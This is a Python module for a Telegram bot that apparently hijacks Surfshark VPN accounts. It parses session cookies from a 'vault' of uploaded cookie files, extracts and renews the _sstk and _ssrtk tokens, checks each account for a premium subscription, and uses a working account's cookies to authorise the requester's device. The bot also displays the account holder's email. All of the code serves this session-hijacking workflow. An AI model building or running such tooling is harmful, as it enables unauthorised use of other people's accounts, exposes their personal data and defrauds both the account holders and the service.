# ============================================================
# SURFSHARK AUTO-LOGIN SERVICE - COMPLETE FIXED
# All token extraction, revive, and login logic included
# ============================================================

import os
import re
import json
import glob
import random
import time
import base64
import requests
from typing import Optional, Dict, Tuple
from datetime import datetime

from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ContextTypes, ConversationHandler

from config import E, COOKIES_FOLDER
from utils import pe, extract_cookie_dict, build_cookie_string, update_bot_stats


# ─── Constants ──────────────────────────────────────────────

WAITING_SURFSHARK_CODE = 4
SURFSHARK_USER_AGENT = "Surfshark/4.1.2 (com.surfshark.vpnclient.ios; build:4; iOS 26.1.0) Alamofire/5.10.2 device/mobile"
SURFSHARK_API_BASE = "https://api.surfshark.com"


# ─── Token Extraction (FIXED) ───────────────────────────────

def surfshark_extract_token(content: str, token_name: str) -> Optional[str]:
    """
    Extract JWT token from cookie file content.
    Handles Netscape format, JSON, and raw text.
    """
    # Pattern 1: Direct assignment with common delimiters
    patterns = [
        rf'{token_name}[=\s]+([A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
        rf'"{token_name}"\s*:\s*"([^"]+)"',
        rf'{token_name}\s+([eyJ][A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, content, re.IGNORECASE)
        if match:
            token = match.group(1)
            if token.count('.') >= 2:
                return token

    # Pattern 2: Parse line by line (Netscape format)
    for line in content.split('\n'):
        if token_name in line:
            clean_line = line
            if line.startswith('#HttpOnly_'):
                clean_line = line[10:]
            elif line.startswith('#') and not line.startswith('#HttpOnly_'):
                continue
            
            parts = re.split(r'\t+|\s+', clean_line)
            for i, part in enumerate(parts):
                if part == token_name and i + 1 < len(parts):
                    value = parts[i + 1].strip()
                    if value and not value.startswith('#'):
                        if value.count('.') >= 2:
                            return value
                        jwt_match = re.search(r'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', value)
                        if jwt_match:
                            return jwt_match.group(0)
    
    return None


def surfshark_extract_all_tokens(content: str) -> Dict[str, Optional[str]]:
    """Extract both _sstk and _ssrtk tokens."""
    return {
        '_sstk': surfshark_extract_token(content, '_sstk'),
        '_ssrtk': surfshark_extract_token(content, '_ssrtk'),
    }


# ─── Token Revive / Refresh ─────────────────────────────────

def surfshark_revive_token(ssrtk_token: str) -> Optional[Dict]:
    """
    Use the refresh token (_ssrtk) to get a fresh access token (_sstk).
    This is the core Surfshark logic that makes it work.
    """
    if not ssrtk_token:
        return None
    
    try:
        url = f"{SURFSHARK_API_BASE}/v1/auth/renew"
        headers = {
            "Content-Type": "application/json;charset=utf-8",
            "Accept": "application/json",
            "User-Agent": SURFSHARK_USER_AGENT,
            "Authorization": f"Bearer {ssrtk_token}"
        }
        
        response = requests.post(url, json={}, headers=headers, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            new_token = data.get("token")
            new_renew = data.get("renewToken")
            
            if new_token:
                return {
                    'sstk': new_token,
                    'ssrtk': new_renew or ssrtk_token,
                    'expires_in': data.get('expiresIn', 3600)
                }
            else:
                return None
        else:
            return None
    except Exception as e:
        return None


# ─── Account Info ────────────────────────────────────────────

def surfshark_get_account_info(sstk_token: str) -> Tuple[bool, Dict]:
    """
    Get account info using the access token.
    Returns (success, data) where data contains email, plan, etc.
    """
    try:
        url = f"{SURFSHARK_API_BASE}/v2/account/users/me"
        headers = {
            "Accept": "application/json",
            "User-Agent": SURFSHARK_USER_AGENT,
            "Authorization": f"Bearer {sstk_token}"
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            return True, data
        else:
            return False, {'error': f'HTTP {response.status_code}'}
    except Exception as e:
        return False, {'error': str(e)}


def surfshark_get_subscription(sstk_token: str) -> Tuple[bool, Dict]:
    """
    Get subscription details using the access token.
    Returns (is_premium, subscription_data).
    """
    try:
        url = f"{SURFSHARK_API_BASE}/v1/payment/subscriptions/current"
        headers = {
            "Accept": "application/json",
            "User-Agent": SURFSHARK_USER_AGENT,
            "Authorization": f"Bearer {sstk_token}"
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if data and 'name' in data:
                plan = data.get('name', 'Unknown')
                status = data.get('status', 'Unknown').lower()
                is_premium = status in ['active', 'active_grace'] and 'free' not in plan.lower()
                return is_premium, {
                    'plan': plan,
                    'status': data.get('status', 'Unknown'),
                    'expires_at': data.get('expiresAt', 'Unknown'),
                }
            else:
                return False, {'error': 'No subscription data'}
        elif response.status_code == 204:
            return False, {'error': 'No active subscription'}
        else:
            return False, {'error': f'HTTP {response.status_code}'}
    except Exception as e:
        return False, {'error': str(e)}


# ─── Device Login ────────────────────────────────────────────

def surfshark_login_device(cookies: dict, code: str) -> bool:
    """
    Login a device using the cookie and 6-digit code.
    This is the final step that authorizes the TV/device.
    """
    cookie_string = build_cookie_string(cookies)
    
    url = "https://my.surfshark.com/account/p_api/v1/account/authorization/assign"
    headers = {
        "Content-Type": "application/json;charset=utf-8",
        "Accept": "application/json",
        "User-Agent": SURFSHARK_USER_AGENT,
        "Cookie": cookie_string,
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://my.surfshark.com",
        "Referer": "https://my.surfshark.com/account/login-code",
    }
    payload = {"code": code.upper().strip()}
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=15)
        return response.status_code == 200
    except:
        return False


# ─── Main Processing Function ───────────────────────────────

def surfshark_process_cookie(content: str) -> Tuple[bool, Dict]:
    """
    Process a single cookie file:
    1. Extract _sstk and _ssrtk
    2. Revive the token
    3. Get account info
    4. Check if premium
    5. Return result
    """
    tokens = surfshark_extract_all_tokens(content)
    sstk = tokens.get('_sstk')
    ssrtk = tokens.get('_ssrtk')
    
    if not sstk:
        return False, {'error': 'No _sstk found in cookie'}
    
    if not ssrtk:
        return False, {'error': 'No _ssrtk found in cookie'}
    
    # Try to revive the token first
    revived = surfshark_revive_token(ssrtk)
    
    if revived:
        sstk = revived['sstk']
        ssrtk = revived['ssrtk']
    
    # Get account info
    ok, account_data = surfshark_get_account_info(sstk)
    if not ok:
        return False, {'error': 'Failed to get account info'}
    
    email = account_data.get('email', 'Unknown')
    
    # Check subscription
    is_premium, sub_data = surfshark_get_subscription(sstk)
    
    if not is_premium:
        return False, {'error': 'Not a premium account'}
    
    # Get cookies from the content
    cookies = extract_cookie_dict(content)
    
    return True, {
        'email': email,
        'plan': sub_data.get('plan', 'Premium'),
        'status': sub_data.get('status', 'Active'),
        'expires_at': sub_data.get('expires_at', 'Unknown'),
        'sstk': sstk,
        'ssrtk': ssrtk,
        'cookies': cookies,
        'account_data': account_data,
    }


# ─── Helper Functions for UI ────────────────────────────────

def cancel_button() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(
            f"{pe(E['cross'])} Cancel",
            callback_data="main_menu",
            icon_custom_emoji_id=E['cross']
        )]
    ])


def back_button() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(
            f"{pe(E['prev'])} Back",
            callback_data="main_menu",
            icon_custom_emoji_id=E['prev']
        )]
    ])


# ─── Telegram Handlers ───────────────────────────────────────

async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the Surfshark auto-login conversation."""
    query = update.callback_query
    await query.answer()
    
    cookie_count = len(glob.glob(f"{COOKIES_FOLDER}/*.txt"))
    
    await query.edit_message_text(
        f"{pe(E['globe'])} <b>Surfshark Auto-Login</b>\n\n"
        f"{pe(E['next'])} Send me the <b>6-digit device code</b>\n"
        f"{pe(E['bolt'])} from the Surfshark app.\n\n"
        f"{pe(E['star'])} <b>Cookies in vault:</b> {cookie_count}\n\n"
        f"{pe(E['warn'])} I will find a premium cookie and log you in.",
        reply_markup=cancel_button(),
        parse_mode="HTML"
    )
    return WAITING_SURFSHARK_CODE


async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle the 6-digit code and process Surfshark login."""
    code = update.message.text.strip()
    
    if len(code) != 6 or not code.isdigit():
        await update.message.reply_html(
            f"{pe(E['cross'])} Invalid code. Please send a <b>6-digit</b> code.",
            reply_markup=cancel_button()
        )
        return WAITING_SURFSHARK_CODE

    status_msg = await update.message.reply_html(
        f"{pe(E['loading'])} Searching for premium cookie...\n\n"
        f"{pe(E['hourglass'])} Checking cookies in vault..."
    )

    cookie_files = glob.glob(f"{COOKIES_FOLDER}/*.txt")
    
    if not cookie_files:
        await status_msg.edit_text(
            f"{pe(E['cross'])} <b>No cookies found!</b>\n\n"
            f"{pe(E['warn'])} Upload cookies first using <code>/upload</code>",
            reply_markup=back_button(),
            parse_mode="HTML"
        )
        update_bot_stats(False)
        return ConversationHandler.END

    random.shuffle(cookie_files)
    success = False
    result_info = {}
    attempted = 0

    for filepath in cookie_files:
        attempted += 1
        
        try:
            # Update progress
            if attempted % 5 == 0:
                await status_msg.edit_text(
                    f"{pe(E['loading'])} Searching...\n\n"
                    f"{pe(E['bolt'])} Attempted: {attempted}/{len(cookie_files)}\n"
                    f"{pe(E['hourglass'])} Looking for premium account..."
                )
            
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            ok, info = surfshark_process_cookie(content)
            
            if ok and info.get('cookies'):
                # Try to login with this cookie
                login_ok = surfshark_login_device(info['cookies'], code)
                if login_ok:
                    success = True
                    result_info = info
                    break
        except Exception as e:
            continue

    if success:
        await status_msg.edit_text(
            f"{pe(E['check'])} <b>🎉 Device Authorized Successfully!</b>\n\n"
            f"{pe(E['bolt'])} <b>Email:</b> {result_info.get('email', 'Unknown')}\n"
            f"{pe(E['star'])} <b>Plan:</b> {result_info.get('plan', 'Premium')}\n"
            f"{pe(E['hourglass'])} <b>Expires:</b> {result_info.get('expires_at', 'Unknown')}\n"
            f"{pe(E['globe'])} <b>Status:</b> {result_info.get('status', 'Active')}\n\n"
            f"{pe(E['sparkle'])} Your device is now connected to Surfshark!",
            reply_markup=back_button()
        )
        update_bot_stats(True)
    else:
        await status_msg.edit_text(
            f"{pe(E['cross'])} <b>Failed to authorize.</b>\n\n"
            f"{pe(E['warn'])} <b>Possible reasons:</b>\n"
            f"• No premium cookie found in vault\n"
            f"• The device code is invalid or expired\n"
            f"• All cookies have been used\n\n"
            f"{pe(E['next'])} Try again with a fresh code from the app.",
            reply_markup=back_button()
        )
        update_bot_stats(False)

    return ConversationHandler.END